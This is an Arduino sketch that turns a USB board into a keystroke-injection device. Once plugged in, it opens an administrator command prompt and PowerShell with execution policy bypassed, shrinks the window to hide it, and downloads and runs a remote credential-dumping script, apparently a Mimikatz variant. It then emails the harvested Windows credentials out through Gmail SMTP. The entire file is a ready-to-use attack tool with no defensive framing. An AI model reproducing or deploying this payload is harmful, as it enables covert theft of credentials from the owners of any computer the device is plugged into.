#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream and delays to give time for computer to recognise the device
  Keyboard.begin();
  delay(4000);

  // Opens CMD as admin
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cmd");
  delay(400);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(800);
  typeKey(KEY_LEFT_ARROW);
  typeKey(KEY_RETURN);   
  delay(1500);

  // Opens Powershell as admin and exits CMD
  
  Keyboard.print("start powershell -ex bypass && exit");
  typeKey(KEY_RETURN);
  delay(2000);
  
  // Shrinks Powershell
  Keyboard.print("[console]::WindowHeight=1;[console]::WindowWidth=1");
  typeKey(KEY_RETURN);
  delay(400);
  
  // Downloads Mimidogz
  Keyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://git.io/vywDP')");
  typeKey(KEY_RETURN);
  delay(5000);
  
  // Invokes Mimidogz
  Keyboard.print("$Body = Invoke-MimiDogz -DumpCred");
  typeKey(KEY_RETURN);
  delay(5000);

  // Emails Results and exits
  Keyboard.print("$EmailFrom = 'gmailname\"gmail.com'");
  typeKey(KEY_RETURN);
  delay(400);
  Keyboard.print("$EmailTo = 'gmailname\"gmail.com'");
  typeKey(KEY_RETURN);
  delay(400);  
  Keyboard.print("$Subject = 'Report'");
  typeKey(KEY_RETURN);
  delay(400);
  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
  typeKey(KEY_RETURN);
  delay(400);
  Keyboard.print("$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  typeKey(KEY_RETURN);
  delay(400);  
  Keyboard.print("$SMTPClient.EnableSsl = $true");
  typeKey(KEY_RETURN);
  delay(400);  
  Keyboard.print("$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(@gmailname without @gmail.com@, @gmail password@);");
  typeKey(KEY_RETURN);
  delay(400);    
  Keyboard.print("$SMTPClient.EnableSsl = $true");
  typeKey(KEY_RETURN);
  delay(400);   
  Keyboard.print("$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)");
  typeKey(KEY_RETURN);
  delay(800);    
  Keyboard.print("exit");
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
